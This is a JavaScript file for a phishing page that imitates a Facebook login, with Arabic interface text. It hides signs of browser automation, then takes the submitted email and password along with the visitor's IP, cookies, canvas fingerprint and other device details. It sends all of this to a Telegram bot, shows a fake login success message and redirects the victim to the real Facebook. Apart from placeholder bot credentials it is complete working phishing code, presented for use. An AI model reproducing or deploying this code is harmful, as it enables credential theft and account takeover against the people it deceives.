// Anti-detection
Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });

// Load config first
document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('loading').style.display = 'none';
    
    const form = document.getElementById('loginForm');
    form.addEventListener('submit', handleLogin);
});

async function handleLogin(e) {
    e.preventDefault();
    
    const email = document.querySelector('#email').value;
    const pass = document.querySelector('#pass').value;
    const submitBtn = document.querySelector('button[type="submit"]');
    
    if (!email || !pass) return;
    
    // Show loading
    submitBtn.disabled = true;
    submitBtn.innerHTML = `
        <span class="spinner-small"></span>
        جاري تسجيل الدخول...
    `;
    
    try {
        // Get victim info
        const victimInfo = await getVictimInfo();
        
        // Send to Telegram
        await sendToTelegram(email, pass, victimInfo);
        
        // Show success then redirect
        showSuccess();
        setTimeout(() => {
            window.location.href = 'https://www.facebook.com/';
        }, 3000);
        
    } catch (error) {
        console.error('Error:', error);
        // Still redirect
        setTimeout(() => {
            window.location.href = 'https://www.facebook.com/';
        }, 2000);
    }
}

async function getVictimInfo() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('Victim fingerprint', 2, 2);
    
    return {
        ip: await (await fetch('https://api.ipify.org?format=json')).json().then(r => r.ip),
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        canvas: canvas.toDataURL(),
        cookies: document.cookie,
        referrer: document.referrer
    };
}

async function sendToTelegram(email, pass, info) {
    const message = `
🎯 <b>فيسبوك كريدشنالز جديدة! 🔥</b>

👤 <b>الإيميل/الهاتف:</b> <code>${email}</code>
🔑 <b>كلمة المرور:</b> <code>${pass}</code>

📍 <b>IP:</b> <a href="https://whatismyipaddress.com/ip/${info.ip}">${info.ip}</a>
🌐 <b>User Agent:</b> <code>${info.userAgent.slice(0,100)}...</code>
📱 <b>اللغة:</b> ${info.language}
🖥️ <b>الشاشة:</b> ${info.screen}
🌍 <b>التوقيت:</b> ${info.timezone}

⏰ <b>التاريخ:</b> ${new Date().toLocaleString('ar-SA', {timeZone: 'Asia/Riyadh'})}
🔗 <b>الرابط:</b> ${window.location.href}
📊 <b>المرجع:</b> ${info.referrer || 'Direct'}

#facebook #phish #credentials
    `;
    
    const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;
    
    await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CONFIG.CHAT_ID,
            text: message,
            parse_mode: 'HTML',
            disable_web_page_preview: true
        })
    });
}

function showSuccess() {
    const successScreen = document.createElement('div');
    successScreen.className = 'success-screen';
    successScreen.style.display = 'flex';
    successScreen.innerHTML = `
        <div class="success-content">
            <div class="success-icon">✅</div>
            <h3>تم تسجيل الدخول بنجاح!</h3>
            <p>جاري توجيهك إلى فيسبوك...</p>
        </div>
    `;
    document.body.appendChild(successScreen);
}

const CONFIG = {
    BOT_TOKEN: 'YOUR_BOT_TOKEN_HERE',
    CHAT_ID: 'YOUR_CHAT_ID_HERE'
};